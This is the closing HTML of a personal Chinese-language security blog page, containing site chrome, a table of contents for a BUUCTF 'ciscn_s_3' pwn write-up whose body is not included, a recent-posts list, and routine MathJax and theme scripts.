class="pagination-info"><div class="label">上一篇</div><div class="prev_info">cachelab实验报告:模拟cache的功能</div></div></a></div><div class="next-post pull-right"><a href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/" title="动态调试工具的使用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">动态调试工具的使用</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><a href="/"> <div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div></a><div class="author-info__name">xia0ji233</div><div class="author-info__description">Nepnep team</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">283</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">153</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xia0ji233"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xia0ji233" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xia0ji233@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">老当益壮，宁移白首之心？穷且益坚，不坠青云之志。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#buuctf-ciscn-s-3"><span class="toc-number">1.</span> <span class="toc-text">buuctf:ciscn_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">寻找漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%BA%A2%E5%87%BA"><span class="toc-number">1.3.</span> <span class="toc-text">第一次溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%BA%A2%E5%87%BA"><span class="toc-number">1.4.</span> <span class="toc-text">第二次溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEgadget"><span class="toc-number">1.4.1.</span> <span class="toc-text">寻找gadget</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.5.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/31/Summary2024/" title="2024年终总结">2024年终总结</a><time datetime="2024-12-31T11:00:00.000Z" title="发表于 2024-12-31 19:00:00">2024-12-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/11/qwb2024_final_reverse/" title="强网杯S8决赛Reverse writeup">强网杯S8决赛Reverse writeup</a><time datetime="2024-12-11T05:00:00.000Z" title="发表于 2024-12-11 13:00:00">2024-12-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/qwb2024_final/" title="强网杯S8决赛pwn writeup">强网杯S8决赛pwn writeup</a><time datetime="2024-12-07T17:00:00.000Z" title="发表于 2024-12-08 01:00:00">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/24/WindowsDriver1/" title="windows驱动开发（1）——Windows驱动字符串">windows驱动开发（1）——Windows驱动字符串</a><time datetime="2024-11-24T15:00:00.000Z" title="发表于 2024-11-24 23:00:00">2024-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/23/WindowsDriver0/" title="windows驱动开发（0）——Windows驱动开发的基础知识">windows驱动开发（0）——Windows驱动开发的基础知识</a><time datetime="2024-11-22T19:00:00.000Z" title="发表于 2024-11-23 03:00:00">2024-11-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By xia0ji233</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">welcome to my blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
